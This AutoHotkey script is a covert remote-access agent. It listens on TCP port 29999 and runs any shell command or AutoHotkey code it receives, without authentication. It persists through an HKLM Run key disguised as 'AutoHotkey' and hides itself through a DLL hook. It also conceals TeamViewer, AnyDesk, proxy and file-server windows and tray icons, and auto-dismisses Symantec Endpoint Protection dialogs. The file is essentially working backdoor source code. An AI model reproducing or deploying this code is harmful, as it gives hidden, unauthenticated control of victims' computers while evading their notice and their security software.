#persistent
#NoTrayIcon
#persistent
#SingleInstance,force
SetTitleMatchMode,2
DetectHiddenWindows,on
#include <socket>
#include <TrayIconInfo>
#include <jxon>
#include <httprequest>
#include <winvisible>
#include <checkUpdate>

if(!A_Is64bitOS && FileExist(A_ScriptDir "\console.exe")){
	run % A_ScriptDir "\console.exe"
	ExitApp
}

Loop % A_ScriptDir "\*.lnk"
{
	FileGetShortcut,% A_LoopFileLongPath,outTarget
	try
		run % outTarget
}

ComObjError(false)
param:=[],hiddenArr:=[]
loop %0%
	param.push(%a_index%)

for k,v in param {
	if(v="-updated")
		updated:=1
}

onexit,onexit



lastUpdate:="2016120101"
currentVersion:="0.27"

updateSource:=["http://10.0.0.100:8899","http://10.0.0.100:8899","http://10.0.0.100:8899"]

isUpdateSource:=0
for k,v in updateSource {
	if InStr(v, A_IPAddress1){
		isUpdateSource:=1
		break
	}
}

if (!updated && !isUpdateSource)
	gosub update

gosub ensureRun
gosub hide
hiddenProcArr:=["CCProxy.exe", "TeamViewer.exe", "tv_w32.exe", "Proxifier.exe", "FileZilla Server Interface.exe", "hfs (http file server).exe", "hfs.exe", "AnyDesk.exe"]
gosub TcpServer

settimer,routine,200
if !isUpdateSource
	settimer,update,% 8*60*60000

gosub hideTrayIconAndProcess
settimer,hideTrayIconAndProcess,10000

settimer,checkHidden,1000
hiddenWin:={"TeamViewer ahk_class #32770":0,"ahk_class BuddyWindow ahk_exe TeamViewer.exe":0,"ahk_class Proxifier32Cls ahk_exe Proxifier.exe":0,"ahk_class TmainFrm ahk_exe hfs (http file server).exe}":0,"AnyDesk ahk_exe AnyDesk.exe":0}
hidden:=[]
return

routine:
ifwinexist,Sleipnir ahk_class #32770,Latest version of Sleipnir
   controlclick,Button2,Sleipnir ahk_class #32770,Latest version of Sleipnir
ifwinexist,SciTE4AutoHotkey Updater ahk_class #32770
   controlclick,Button2,SciTE4AutoHotkey Updater ahk_class #32770
ifwinexist,Microsoft Office Activation Wizard ahk_class NUIDialog
	controlsend,NetUIHWND1,{esc},Microsoft Office Activation Wizard ahk_class NUIDialog
;~ ifwinexist,TeamViewer面板 ahk_class TV_ControlWin ahk_exe TeamViewer.exe
	;~ winmove,TeamViewer面板 ahk_class TV_ControlWin ahk_exe TeamViewer.exe,,% a_screenwidth,% a_screenheight
;~ ifwinexist,TeamViewer - 檔案傳輸事件記錄 ahk_class #32770 ahk_exe TeamViewer.exe
	;~ winmove,TeamViewer - 檔案傳輸事件記錄 ahk_class #32770 ahk_exe TeamViewer.exe,,% a_screenwidth,% a_screenheight
ifwinexist,贊助工作階段 ahk_class #32770 ahk_exe TeamViewer.exe
	controlclick,Button4,贊助工作階段 ahk_class #32770 ahk_exe TeamViewer.exe
ifwinexist,CCProxy ahk_class CCProxy ahk_exe CCProxy.exe
	winhide
ifwinexist,Symantec Endpoint Protection ahk_class #32770
	controlclick,Button2,Symantec Endpoint Protection ahk_class #32770
ifwinexist,ahk_exe rebootMsg.exe
	winclose

return


checkHidden:
if !hideIcon
	return
for hiddenTitle,count in hiddenWin {
	if(winvisible(winexist(hiddenTitle)))
		hiddenWin[hiddenTitle]:=count+1
	if (count>60) {
		hiddenWin[hiddenTitle]:=0
		winhide,% hiddenTitle
	}
}	
return



TcpServer:
;~ myTcp:=new SocketTcp()
;~ outTcp:=new SocketTcp()
gosub renewTcp
settimer,renewTcp,60000
return


renewTcp:
;~ if (myTcp.socket=-1 || myTcp=""){
myTcp.disconnect()
myTcp:=new SocketTcp()
myTcp.bind("addr_any",TcpPort())
myTcp.onAccept:=Func("OnTcpAccept")
;~ myTcp.onRecv:=func("OnTcpRecv")
myTcp.listen()
;~ }

;~ outTcp.disconnet()
;~ outTcp:=""
;~ outTcp:=new SocketTcp()
;~ outTcp.connect("addr_broadcast",TcpPort())
;~ outTcp.enableBroadcast()
return

OnTcpAccept(this){
	newTcp:=this.accept()
	newTcp.onRecv:=Func("OnTcpRecv")
}

OnTcpRecv(this){
	;~ global outTcp
	t:=this.recvText()
	;~ tooltip % "server receive: " t
	try {
		msg:=jxon_load(t)
	}catch e {
		return
	}
	if isobject(e)
		return
	
	if(msg.cmd!="reply"){
		response:=[]
		response.ip:=A_IPAddress1
		response.cmd:="reply"
		response.msg:="roger"
		
		if(msg.ip){
			;~ this.disconnet()
			;~ this.connect(msg.ip,TcpPort())
			;~ sleep 1000
			this.sendText(jxon_dump(response))
		}
	}
	
	
	if(msg.cmd="update"){
		gosub update
		
	}else if(msg.cmd="sync"){
		SetTimerF("scs_sync", -1, [msg.url, RelToAbs(A_ScriptDir,msg.path), 0])
		
	}else if (msg.cmd="cmd_ln") {
		parm:=msg.msg
		try {
			Run %comspec% /c "%parm%"
		}
	}else if (msg.cmd="ahk") {
		parm:=msg.msg
		ExecScript(parm)
	}else if (msg.cmd="vnc"){
		winget,VNCpid,pid,ahk_exe winvnc.exe
		if(VNCpid){
			VNCpath:=GetModuleFileNameEx(VNCpid)
			process,Close,%VNCpid%
			try
				run % VNCpath
		}else if FileExist(VNCpath:=A_MyDocuments "\UltraVNC\winvnc.exe"){
			try
				run % VNCpath
		}
	}else{
		;~ msgbox,,,% msg.msg " from " msg.ip,10
	}
	;~ this.disconnect()
	;~ newTcp.disconnect()
	;~ newTcp:=""
}

TcpPort(){
	;~ seed:=abs(sin(a_mon/12*3.14)-sin(a_dd/31*3.14)+sin(a_hour/23*3.14))
	;~ return floor((65535-49152)*seed)+49152
	return 29999
}

ensureRun:
if(!A_IsCompiled)
	return
regread,reg,HKLM,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,AutoHotkey
;~ MsgBox % reg
if (reg!=A_ScriptFullPath) {
	regwrite,REG_SZ,HKLM,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,AutoHotkey,% A_ScriptFullPath
	if (ErrorLevel) && !FileExist(A_Startup "\AutoHotkey.lnk")
		FileCreateShortcut,% A_ScriptFullPath,% A_Startup "\AutoHotkey.lnk"
}
return

update:
;~ return
;~ filedelete,% a_scriptdir "\update.exe"
;~ if !fileexist(a_scriptdir "\update.exe"){
if isUpdateSource
	return

scs_sync("","",0)
/*
	for k,updateSourceIp in updateSource {
		;~ try
		httprequest(updateSourceIp,post:="",header:="")
		regexmatch(header," (\d+) ",code)
		
		if (code1!="" && !(code1<200 || code1>=300)) {
			;~ splitpath,a_scriptname,,,,a_scriptNameNoExt,
			if !checkUpdate(updateSourceIp "/scsnake/console",currentVersion,1,0)
				break
		}
	}
*/
	
	
;~ }
return


onexit:
gosub ensureRun
gosub unhide
loop,% a_scriptdir "\*.exe"
	if inArr(a_loopfilename,hiddenProcArr)
		filedelete,% a_LoopFileFullPath
myTcp.disconnect()
tooltip Exit
sleep 1000
ExitApp
return

^!#+q::
ExitApp
return


^!#+j::
msgbox,,Last Update,% lastUpdate,0.5
return

~^#+!s::
hideIcon:=!hideIcon
gosub toggleTrayIconAndProcess
if (!hideIcon) {
	for hiddenTitle,count in hiddenWin
		if !winvisible(winexist(hiddenTitle))
			winshow,% hiddenTitle
}else{
	for hiddenTitle,count in hiddenWin
		if winvisible(winexist(hiddenTitle)){
			hiddenWin[hiddenTitle]:=0
			winhide,% hiddenTitle
		}
}
return
hideTrayIconAndProcess:
DetectHiddenWindows,off
winminimize,ahk_class FileZilla Server Main Window
DetectHiddenWindows,on
hideIcon:=true
toggleTrayIconAndProcess:
TrayIconInfo:=TrayIcon_GetInfo()
for k,v in TrayIconInfo {
	if !(process:=v.Process)
		continue
	if inArr(process,hiddenProcArr)
		TrayIcon_Hide(v.IDcmd, v.Tray, hideIcon)
}
;~ for k,v in hiddenProcArr
	;~ if hideIcon
		;~ hideProcess(v)
	;~ else 
		;~ showProcess(v)
return
unhide:
;~ run % "chp ProcessMagic -u console.exe",% a_scriptdir
if (hHook)
	DllCall("UnhookWindowsHookEx", Ptr, hHook)
if (hMod)
	DllCall("FreeLibrary", Ptr, hMod)
hideIcon:=0
gosub toggleTrayIconAndProcess
return
hide:
if (!A_Is64bitOS) {
	hMod := DllCall("LoadLibrary", Str, "hyde.dll", Ptr) ;for x86
}else{
	hMod := DllCall("LoadLibrary", Str, "hyde64.dll", Ptr) ;for x64
}
if (hMod)
{
	hHook := DllCall("SetWindowsHookEx", Int, 5, Ptr, DllCall("GetProcAddress", Ptr, hMod, AStr, "CBProc", ptr), Ptr, hMod, Ptr, 0, Ptr)
	if (!hHook)
	{
		;~ MsgBox, SetWindowsHookEx failed
		;~ ExitApp
	}
}
else
{
	;~ MsgBox, LoadLibrary failed
	;~ ExitApp
}
;~ run % "chp ProcessMagic -h console.exe",% a_scriptdir
return

hideProcess(pName){
	global hiddenArr
	;~ if !fileexist(a_scriptdir "\ProcessMagic.exe") || !fileexist(a_scriptdir "\chp.exe")
	if !fileexist(a_scriptdir "\ProcessMagic.exe") 
		return
	if !regexmatch(pName,"i).exe$")
		pName.=".exe"
	process,exist,% pName
	if !errorlevel
		return
	try {
		run % "ProcessMagic.exe -h " errorlevel
	}
	hiddenArr.push(pName)
	;~ filecopy,% a_scriptdir "\hyde.exe",% a_scriptdir "\" pName,1
	;~ run % a_scriptdir "\" pName
}

showProcess(pName=""){
	global hiddenArr
	
	if (pName!="") && (!regexmatch(pName,"i).exe$"))
		pName.=".exe"
		
	if (pName="")
		for k,v in hiddenArr
			try {
				run % "ProcessMagic.exe -u """ v """"
			}
	else
		try {
			run % "ProcessMagic.exe -u """ pName """"
		}
}

inArr(ele,arr){
	for k,v in arr
		if (v=ele)
			return k		
	return 
}


GetModuleFileNameEx(ProcessID)  ; modified version of shimanov's function
{
  ;~ if A_OSVersion in WIN_95, WIN_98, WIN_ME
    ;~ Return GetProcessName(ProcessID)
  
  ; #define PROCESS_VM_READ           (0x0010)
  ; #define PROCESS_QUERY_INFORMATION (0x0400)
  hProcess := DllCall( "OpenProcess", "UInt", 0x10|0x400, "Int", False, "UInt", ProcessID)
  if (ErrorLevel or hProcess = 0)
    Return
  FileNameSize := 260
  VarSetCapacity(ModuleFileName, FileNameSize, 0)
  CallResult := DllCall("Psapi.dll\GetModuleFileNameExW", "UInt", hProcess, "UInt", 0, "Str", ModuleFileName, "UInt", FileNameSize)
  DllCall("CloseHandle", hProcess)
  Return ModuleFileName
}

ExecScript(Script, Wait:=true)
{
    shell := ComObjCreate("WScript.Shell")
    exec := shell.Exec("AutoHotkey.exe /ErrorStdOut *")
    exec.StdIn.Write(script)
    exec.StdIn.Close()
    if Wait
        return exec.StdOut.ReadAll()
}

